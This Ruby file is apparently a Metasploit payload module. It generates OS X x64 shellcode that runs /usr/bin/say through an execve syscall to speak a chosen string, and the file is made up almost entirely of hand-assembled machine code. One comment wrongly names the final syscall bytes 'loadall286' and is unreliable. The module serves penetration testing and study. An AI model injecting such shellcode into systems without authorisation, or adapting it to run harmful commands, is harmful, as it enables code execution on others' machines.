##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 53

  include Msf::Payload::Single

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'OS X x64 say Shellcode',
        'Description' => 'Say an arbitrary string outloud using Mac OS X text2speech',
        'Author' => 'nemo <nemo[at]felinemenace.org>',
        'License' => MSF_LICENSE,
        'Platform' => 'osx',
        'Arch' => ARCH_X64
      )
    )

    # exec payload options
    register_options(
      [
        OptString.new('TEXT', [ true, 'The text to say', "Hello\!"]),
      ]
    )
  end

  # build the shellcode payload dynamically based on the user-provided CMD
  def generate(_opts = {})
    say = (datastore['TEXT'] || '') << "\x00"
    call = "\xe8" + [say.length + 0xd].pack('V')

    "\x48\x31\xC0" + # xor rax,rax
      "\xB8\x3B\x00\x00\x02" +            # mov eax,0x200003b
      call +
      "/usr/bin/say\x00" +
      say +
      "\x48\x8B\x3C\x24" +                # mov rdi,[rsp]
      "\x4C\x8D\x57\x0D" +                # lea r10,[rdi+0xd]
      "\x48\x31\xD2" +                    # xor rdx,rdx
      "\x52" +                            # push rdx
      "\x41\x52" +                        # push r10
      "\x57" +                            # push rdi
      "\x48\x89\xE6" +                    # mov rsi,rsp
      "\x0F\x05"                          # loadall286
  end
end
